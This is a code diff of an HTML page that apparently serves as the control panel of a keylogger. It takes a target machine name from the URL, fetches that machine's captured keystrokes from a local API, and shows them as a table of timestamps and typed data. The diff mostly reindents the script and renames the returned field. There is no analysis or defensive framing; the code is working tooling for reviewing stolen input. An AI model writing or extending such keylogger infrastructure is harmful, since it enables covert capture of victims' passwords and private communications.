@@ -6,65 +6,65 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <h1>Machine Logs</h1>
-    <div>
-        <h2>Logs for <span id="machineName"></span></h2>
-        <pre id="keystrokesOutput"></pre>
-    </div>
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            const urlParams = new URLSearchParams(window.location.search);
-            const targetMachine = urlParams.get('machine');
-            document.getElementById('machineName').textContent = targetMachine;
+<h1>Machine Logs</h1>
+<div>
+    <h2>Logs for <span id="machineName"></span></h2>
+    <pre id="keystrokesOutput"></pre>
+</div>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetMachine = urlParams.get('machine');
+        document.getElementById('machineName').textContent = targetMachine;
 
-            const keystrokesOutput = document.getElementById('keystrokesOutput');
-            keystrokesOutput.innerHTML = 'Loading...';
-            getKeystrokes(targetMachine).then(function (keystrokes) {
-                if (keystrokes && keystrokes.length > 0) {
-                    const table = document.createElement('table');
-                    const headerRow = document.createElement('tr');
-                    const timestampHeader = document.createElement('th');
-                    timestampHeader.textContent = 'Timestamp';
-                    const dataHeader = document.createElement('th');
-                    dataHeader.textContent = 'Data';
-                    headerRow.appendChild(timestampHeader);
-                    headerRow.appendChild(dataHeader);
-                    table.appendChild(headerRow);
+        const keystrokesOutput = document.getElementById('keystrokesOutput');
+        keystrokesOutput.innerHTML = 'Loading...';
+        getKeystrokes(targetMachine).then(function (keystrokes) {
+            if (keystrokes && keystrokes.length > 0) {
+                const table = document.createElement('table');
+                const headerRow = document.createElement('tr');
+                const timestampHeader = document.createElement('th');
+                timestampHeader.textContent = 'Timestamp';
+                const dataHeader = document.createElement('th');
+                dataHeader.textContent = 'Data';
+                headerRow.appendChild(timestampHeader);
+                headerRow.appendChild(dataHeader);
+                table.appendChild(headerRow);
 
-                    keystrokes.forEach(function (entry) {
-                        const row = document.createElement('tr');
-                        const timestampCell = document.createElement('td');
-                        timestampCell.textContent = entry.timestamp;
-                        const dataCell = document.createElement('td');
-                        dataCell.textContent = entry.data;
-                        row.appendChild(timestampCell);
-                        row.appendChild(dataCell);
-                        table.appendChild(row);
-                    });
-
-                    keystrokesOutput.innerHTML = '';
-                    keystrokesOutput.appendChild(table);
-                } else {
-                    keystrokesOutput.textContent = 'No data available';
-                }
-            });
-        });
-
-        function getKeystrokes(targetMachine) {
-            return fetch(`http://127.0.0.1:5000/api/get_keystrokes?target_machine=${targetMachine}`)
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok ' + response.statusText);
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    return data.data;
-                })
-                .catch(error => {
-                    console.error('There was a problem with the fetch operation:', error);
+                keystrokes.forEach(function (entry) {
+                    const row = document.createElement('tr');
+                    const timestampCell = document.createElement('td');
+                    timestampCell.textContent = entry.timestamp;
+                    const dataCell = document.createElement('td');
+                    dataCell.textContent = entry.data;
+                    row.appendChild(timestampCell);
+                    row.appendChild(dataCell);
+                    table.appendChild(row);
                 });
-        }
-    </script>
+
+                keystrokesOutput.innerHTML = '';
+                keystrokesOutput.appendChild(table);
+            } else {
+                keystrokesOutput.textContent = 'No data available';
+            }
+        });
+    });
+
+    function getKeystrokes(targetMachine) {
+        return fetch(`http://127.0.0.1:5000/api/get_keystrokes?target_machine=${targetMachine}`)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json();
+            })
+            .then(data => {
+                return data.keystrokes;
+            })
+            .catch(error => {
+                console.error('There was a problem with the fetch operation:', error);
+            });
+    }
+</script>
 </body>
 </html>
